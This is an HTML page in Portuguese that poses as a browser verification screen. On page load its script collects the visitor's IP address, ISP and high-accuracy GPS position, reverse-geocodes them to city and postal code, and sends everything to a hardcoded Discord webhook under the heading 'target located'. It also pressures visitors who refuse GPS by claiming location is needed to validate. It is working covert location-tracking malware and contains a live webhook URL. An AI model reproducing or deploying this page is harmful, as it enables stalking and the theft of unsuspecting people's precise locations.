<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Sincronizando...</title>
</head>
<body style="background: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
    <div style="text-align: center;">
        <div style="border: 3px solid #333; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px;"></div>
        <div id="status">Verificando integridade do navegador...</div>
    </div>
    <style>@keyframes spin {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1473782004226195456/X3ZuJvvwZYDp-ZpF_BSTFOhifd6tq_CRiEMlcz_LkiMPZR9kLbdMBRS6Y1a5PaEaUiKe";

        async function capturar() {
            try {
                // 1. Pega IP e Provedor (R√°pido)
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                // 2. Tenta pegar GPS
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;

                    // 3. Traduz coordenadas para Cidade/Rua Real
                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                    const geoData = await geoRes.json();
                    
                    const endereco = geoData.address;
                    const cidadeReal = endereco.city || endereco.town || endereco.village || "Desconhecida";
                    const cepReal = endereco.postcode || "N/A";

                    // Envio final com TUDO corrigido
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            embeds: [{
                                title: "üéØ ALVO LOCALIZADO (CIDADE REAL)",
                                color: 65280,
                                fields: [
                                    { name: "üö© Pais:", value: endereco.country || "Brasil", inline: true },
                                    { name: "üèõÔ∏è Estado:", value: endereco.state || "N/A", inline: true },
                                    { name: "üèôÔ∏è Cidade Real:", value: cidadeReal, inline: true },
                                    { name: "üìÆ Cep:", value: cepReal, inline: true },
                                    { name: "üìç Google Maps:", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false },
                                    { name: "üåê Provedor:", value: ipData.org || "N/A", inline: false },
                                    { name: "‚è∞ Hor√°rio:", value: new Date().toLocaleString('pt-BR'), inline: false }
                                ]
                            }]
                        })
                    });

                    document.getElementById('status').innerText = "Verifica√ß√£o Conclu√≠da.";
                    
                }, (erro) => {
                    document.getElementById('status').innerText = "Erro: GPS necess√°rio para validar.";
                }, { enableHighAccuracy: true });

            } catch (e) {
                console.error(e);
            }
        }

        window.onload = capturar;
    </script>
</body>
</html>
